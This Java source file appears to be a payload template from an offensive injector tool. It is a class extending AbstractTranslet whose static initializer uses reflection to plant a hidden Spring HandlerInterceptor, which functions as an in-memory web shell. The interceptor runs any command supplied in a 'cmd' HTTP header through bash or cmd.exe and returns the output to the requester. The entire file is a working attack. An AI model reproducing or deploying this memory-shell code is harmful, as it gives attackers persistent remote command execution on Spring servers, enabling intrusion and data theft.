package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;

public class SpringInterceptor extends AbstractTranslet implements HandlerInterceptor {
    static {
        String cmdHeader = "cmd";

        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        AbstractHandlerMapping abstractHandlerMapping = context.getBean(AbstractHandlerMapping.class);
        Field field = null;
        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
        field.setAccessible(true);
        java.util.ArrayList<Object> adaptedInterceptors = null;
        try {
            adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
//        SpringInterceptor evilInterceptor = new SpringInterceptor("aaa");
        adaptedInterceptors.add(new HandlerInterceptor() {
            @Override
            public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
                String cmd = request.getHeader(cmdHeader);
                if (cmd != null) {
                    try {
                        java.io.PrintWriter printWriter = response.getWriter();
                        ProcessBuilder builder;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                        } else {
                            builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                        }
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
                        String s = bufferedReader.readLine();
                        printWriter.println(s);
                        printWriter.flush();
                        printWriter.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    return false;
                }
                return true;
            }

            @Override
            public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
                HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
            }

            @Override
            public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
                HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
            }
        });
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
